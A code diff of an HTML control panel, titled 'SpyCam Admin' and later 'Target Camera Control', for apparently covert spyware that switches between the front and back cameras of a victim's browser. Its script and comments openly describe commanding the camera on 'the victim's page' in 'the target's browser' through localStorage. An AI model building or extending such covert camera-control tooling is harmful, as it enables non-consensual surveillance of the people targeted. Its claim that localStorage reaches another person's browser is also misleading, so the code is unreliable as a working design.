@@ -3,138 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin - Target Control</title>
+    <title>Camera Control Panel</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Roboto:wght@400;500&display=swap');
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
         body {
-            background-color: #0d0e15;
-            color: #ffffff;
-            font-family: 'Roboto', sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #1f2937;
+            color: white;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            min-height: 100vh;
-            background-image: radial-gradient(circle at center, #1a1c29, #0d0e15);
-            padding: 20px;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        .admin-card {
-            background: #151823;
-            width: 100%;
-            max-width: 400px;
+        .panel {
+            background-color: #374151;
             padding: 30px;
             border-radius: 12px;
-            border: 1px solid #2a2d3e;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
             text-align: center;
+            width: 90%;
+            max-width: 400px;
         }
-
-        h1 {
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 2.2rem;
-            color: #00ffcc;
-            margin-bottom: 25px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-        }
-
+        h2 { margin-top: 0; margin-bottom: 20px; }
         .btn {
             display: block;
             width: 100%;
             padding: 15px;
-            margin-bottom: 15px;
+            margin: 10px 0;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
             border: none;
             border-radius: 8px;
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 1.2rem;
-            font-weight: 700;
             cursor: pointer;
-            text-transform: uppercase;
-            transition: all 0.3s ease;
+            transition: 0.2s;
         }
+        .btn-front { background-color: #3b82f6; }
+        .btn-front:hover { background-color: #2563eb; }
+        
+        .btn-back { background-color: #10b981; }
+        .btn-back:hover { background-color: #059669; }
 
-        .btn-front { 
-            background: linear-gradient(90deg, #007bff, #0056b3); 
-            color: white; 
-        }
-        .btn-front:hover { box-shadow: 0 0 15px rgba(0, 123, 255, 0.4); }
-
-        .btn-back { 
-            background: linear-gradient(90deg, #ff4500, #ff8c00); 
-            color: white; 
-        }
-        .btn-back:hover { box-shadow: 0 0 15px rgba(255, 69, 0, 0.4); }
-
-        .status-box {
-            margin-top: 25px;
-            padding: 15px;
-            background: #1a1e2d;
-            border-radius: 8px;
-            border-left: 4px solid #00ffcc;
-            text-align: left;
-        }
-
-        .status-label {
-            color: #8b92a5;
-            font-size: 0.9rem;
-            margin-bottom: 5px;
-            display: block;
-        }
-
-        .status-value {
-            color: #00ffcc;
-            font-weight: 700;
-            font-size: 1.2rem;
-            font-family: 'Rajdhani', sans-serif;
-            letter-spacing: 1px;
+        .status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #9ca3af;
         }
     </style>
 </head>
 <body>
 
-    <div class="admin-card">
-        <h1>SpyCam Admin</h1>
+    <div class="panel">
+        <h2>📷 Target Camera Control</h2>
         
-        <button class="btn btn-front" onclick="setCamera('user')">📸 Force Front Camera</button>
-        <button class="btn btn-back" onclick="setCamera('environment')">📸 Force Back Camera</button>
+        <button class="btn btn-front" onclick="switchCamera('user')">
+            Switch to FRONT Camera
+        </button>
         
-        <div class="status-box">
-            <span class="status-label">Active Target Camera:</span>
-            <span class="status-value" id="currentCam">FRONT (USER)</span>
+        <button class="btn btn-back" onclick="switchCamera('environment')">
+            Switch to BACK Camera
+        </button>
+
+        <div class="status" id="status-text">
+            Currently commanded: <strong id="current-target" style="color: #fff;">Front Camera</strong>
         </div>
     </div>
 
     <script>
-        // Update the LocalStorage to trigger the camera switch in index.html
-        function setCamera(mode) {
-            localStorage.setItem('cameraTarget', mode);
-            
-            // Update the UI to reflect the change
-            const text = mode === 'user' ? 'FRONT (USER)' : 'BACK (ENVIRONMENT)';
-            const uiElement = document.getElementById('currentCam');
-            uiElement.innerText = text;
-            
-            // Change accent color based on camera
-            uiElement.style.color = mode === 'user' ? '#007bff' : '#ffaa00';
-            document.querySelector('.status-box').style.borderLeftColor = mode === 'user' ? '#007bff' : '#ffaa00';
-        }
-
-        // On load, check what the current camera is set to
+        // Check current setting on load
         window.onload = () => {
-            const current = localStorage.getItem('cameraTarget') || 'user';
-            const text = current === 'user' ? 'FRONT (USER)' : 'BACK (ENVIRONMENT)';
-            const uiElement = document.getElementById('currentCam');
-            uiElement.innerText = text;
+            const current = localStorage.getItem('cameraTarget');
+            if (current === 'environment') {
+                document.getElementById('current-target').innerText = "Back Camera";
+            } else {
+                document.getElementById('current-target').innerText = "Front Camera";
+            }
+        };
+
+        function switchCamera(facingMode) {
+            // This instantly updates localStorage, which triggers the 'storage' event on the victim's page
+            localStorage.setItem('cameraTarget', facingMode);
             
-            uiElement.style.color = current === 'user' ? '#007bff' : '#ffaa00';
-            document.querySelector('.status-box').style.borderLeftColor = current === 'user' ? '#007bff' : '#ffaa00';
+            const modeText = facingMode === 'environment' ? 'Back Camera' : 'Front Camera';
+            document.getElementById('current-target').innerText = modeText;
+            
+            alert(`Command sent: Switched to ${modeText}.\n\n(Note: The main site must be open in the target's browser for this to take effect)`);
         }
     </script>
 </body>
